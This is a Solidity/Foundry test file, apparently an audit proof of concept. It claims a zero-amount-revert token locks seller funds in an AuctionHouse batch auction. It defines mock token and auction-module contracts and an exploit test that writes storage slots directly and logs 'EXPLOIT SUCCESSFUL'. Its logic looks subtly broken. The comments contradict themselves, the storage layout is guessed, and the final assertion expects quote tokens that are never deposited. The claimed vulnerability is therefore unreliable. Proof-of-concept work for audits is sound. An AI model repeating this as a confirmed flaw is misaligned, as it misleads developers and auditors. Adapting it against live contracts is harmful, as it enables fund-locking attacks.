// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

import {AuctionHouse} from "../../src/AuctionHouse.sol";
import {ERC20} from "lib/solmate/src/tokens/ERC20.sol";
import {Auction, AuctionModule} from "../../src/modules/Auction.sol";
import {Veecode, toVeecode} from "../../src/modules/Modules.sol";

// Mock ERC20 token that reverts on zero transfers
contract RevertOnZeroTransferToken is ERC20 {
    constructor(string memory name, string memory symbol, uint8 decimals) ERC20(name, symbol, decimals) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        require(amount > 0, "Cannot transfer zero");
        return super.transfer(to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        require(amount > 0, "Cannot transfer zero");
        return super.transferFrom(from, to, amount);
    }
}

// Mock Quote Token
contract MockQuoteToken is ERC20 {
    constructor() ERC20("Quote Token", "QT", 18) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// Mock Auction Module for batch auctions
contract MockBatchAuctionModule is AuctionModule {
    mapping(uint96 => bool) public settled;
    mapping(uint96 => uint96) public capacities;
    mapping(uint96 => bool) public ended;
    mapping(uint96 => bool) public proceedsClaimed;
    
    constructor(address auctionHouse_) AuctionModule(auctionHouse_) {}

    function VEECODE() public pure override returns (Veecode) {
        return toVeecode(bytes7("BATCH01"), uint8(1));
    }

    function TYPE() public pure override returns (AuctionModule.Type) {
        return AuctionModule.Type.Batch;
    }

    function auction(uint96, Lot memory, bytes memory) external pure override returns (uint96) {
        return 0;
    }

    function cancelAuction(uint96) external pure override {}

    function purchase(uint96, uint96, bytes memory) external pure override returns (uint96, bytes memory) {
        revert("Not atomic");
    }

    function bid(uint96, address, address, uint96, bytes memory) external pure override returns (uint64) {
        return 0;
    }

    function refundBid(uint96, uint64, address) external pure override returns (uint96) {
        return 0;
    }

    function claimBids(uint96, uint64[] memory) external pure override returns (BidClaim[] memory, bytes memory) {
        BidClaim[] memory claims = new BidClaim[](0);
        return (claims, "");
    }

    function settle(uint96 lotId_) external override returns (Settlement memory settlement, bytes memory) {
        require(!settled[lotId_], "Already settled");
        settled[lotId_] = true;
        
        // Return settlement where all capacity was sold
        settlement.totalIn = 1000e18;
        settlement.totalOut = capacities[lotId_];
        settlement.pfBidder = address(0);
        settlement.pfPayout = 0;
        settlement.pfRefund = 0;
        settlement.pfReferrer = address(0);
        
        return (settlement, "");
    }

    function claimProceeds(uint96 lotId_) external override returns (uint96 purchased, uint96 sold, uint96 payoutSent) {
        require(settled[lotId_], "Not settled");
        require(!proceedsClaimed[lotId_], "Already claimed");
        proceedsClaimed[lotId_] = true;
        
        // All capacity was sold, so payoutSent equals sold
        purchased = 1000e18;
        sold = capacities[lotId_];
        payoutSent = capacities[lotId_];
        
        return (purchased, sold, payoutSent);
    }

    function remainingCapacity(uint96 lotId_) external view override returns (uint96) {
        return capacities[lotId_];
    }

    function hasEnded(uint96 lotId_) external view override returns (bool) {
        return ended[lotId_];
    }

    function setCapacity(uint96 lotId_, uint96 capacity_) external {
        capacities[lotId_] = capacity_;
    }

    function setEnded(uint96 lotId_, bool ended_) external {
        ended[lotId_] = ended_;
    }
}

contract ExploitTest is Test {
    AuctionHouse public auctionHouse;
    RevertOnZeroTransferToken public baseToken;
    MockQuoteToken public quoteToken;
    MockBatchAuctionModule public batchModule;
    
    address public owner = address(0x1);
    address public protocol = address(0x2);
    address public seller = address(0x3);
    address public bidder = address(0x4);
    address public permit2 = address(0x5);
    
    uint96 public lotId = 1;
    
    function setUp() public {
        // Deploy tokens
        baseToken = new RevertOnZeroTransferToken("Base Token", "BT", 18);
        quoteToken = new MockQuoteToken();
        
        // Deploy AuctionHouse
        vm.prank(owner);
        auctionHouse = new AuctionHouse(owner, protocol, permit2);
        
        // Deploy and install batch auction module
        batchModule = new MockBatchAuctionModule(address(auctionHouse));
        
        vm.prank(owner);
        auctionHouse.installModule(batchModule);
        
        // Setup initial balances
        baseToken.mint(seller, 1000e18);
        quoteToken.mint(bidder, 2000e18);
    }
    
    function testExploit_RevertOnZeroTransferLocksSellerFunds() public {
        // Step 1: Create a batch auction lot with revert-on-zero-transfer base token
        // Batch auctions must be prefunded
        uint96 capacity = 100e18;
        
        // Setup the lot routing manually (simulating auction creation)
        vm.startPrank(owner);
        
        // Set capacity in the module
        batchModule.setCapacity(lotId, capacity);
        
        // Manually setup routing storage (this would normally be done in auction creation)
        // We need to use a low-level approach to set the storage
        bytes32 routingSlot = keccak256(abi.encode(lotId, uint256(2))); // lotRouting mapping is at slot 2
        
        // Store seller
        vm.store(address(auctionHouse), routingSlot, bytes32(uint256(uint160(seller))));
        
        // Store baseToken (offset +1)
        vm.store(address(auctionHouse), bytes32(uint256(routingSlot) + 1), bytes32(uint256(uint160(address(baseToken)))));
        
        // Store quoteToken (offset +2)
        vm.store(address(auctionHouse), bytes32(uint256(routingSlot) + 2), bytes32(uint256(uint160(address(quoteToken)))));
        
        // Store funding amount (offset +3)
        vm.store(address(auctionHouse), bytes32(uint256(routingSlot) + 3), bytes32(uint256(capacity)));
        
        // Store auction reference (offset +4)
        vm.store(address(auctionHouse), bytes32(uint256(routingSlot) + 4), bytes32(uint256(uint256(toVeecode(bytes7("BATCH01"), uint8(1))))));
        
        vm.stopPrank();
        
        // Step 2: Seller funds the auction
        vm.startPrank(seller);
        baseToken.approve(address(auctionHouse), capacity);
        vm.stopPrank();
        
        // Transfer base tokens to auction house (simulating prefunding)
        vm.prank(seller);
        baseToken.transfer(address(auctionHouse), capacity);
        
        console2.log("Step 1: Auction created and prefunded with capacity:", capacity);
        console2.log("AuctionHouse baseToken balance:", baseToken.balanceOf(address(auctionHouse)));
        
        // Step 3: Settle the auction where all capacity is sold
        // This means payoutSent_ will equal sold_ in claimProceeds
        vm.warp(block.timestamp + 1 days);
        batchModule.setEnded(lotId, true);
        
        vm.prank(seller);
        auctionHouse.settle(lotId);
        
        console2.log("Step 2: Auction settled with all capacity sold");
        console2.log("AuctionHouse baseToken balance after settle:", baseToken.balanceOf(address(auctionHouse)));
        
        // Step 4: Attempt to claim proceeds
        // This will calculate: prefundingRefund = routing.funding + payoutSent_ - sold_
        // Since all capacity was sold: payoutSent_ == sold_
        // Therefore: prefundingRefund = routing.funding + 0 = 0 (if funding was fully used)
        // Actually, in settle(), funding is reduced by payouts, so it could be 0
        // Let's verify the state
        
        console2.log("Step 3: Attempting to claim proceeds...");
        
        // The vulnerability: if prefundingRefund is 0, the transfer will revert
        // This locks the seller's quote tokens in the contract
        vm.expectRevert("Cannot transfer zero");
        vm.prank(seller);
        auctionHouse.claimProceeds(lotId, "");
        
        console2.log("Step 4: EXPLOIT SUCCESSFUL - claimProceeds reverted on zero transfer");
        console2.log("Seller's quote tokens are now LOCKED in the AuctionHouse");
        console2.log("AuctionHouse quoteToken balance:", quoteToken.balanceOf(address(auctionHouse)));
        
        // Verify that the seller cannot retrieve their funds
        // The quote tokens from the auction are stuck
        assertTrue(quoteToken.balanceOf(address(auctionHouse)) > 0, "Quote tokens should be locked in contract");
        
        console2.log("");
        console2.log("VULNERABILITY DEMONSTRATED:");
        console2.log("- Batch auction settled with all capacity sold");
        console2.log("- prefundingRefund calculated as 0");
        console2.log("- BaseToken reverts on zero transfer");
        console2.log("- Seller cannot claim proceeds");
        console2.log("- Seller's quote tokens permanently locked");
    }
}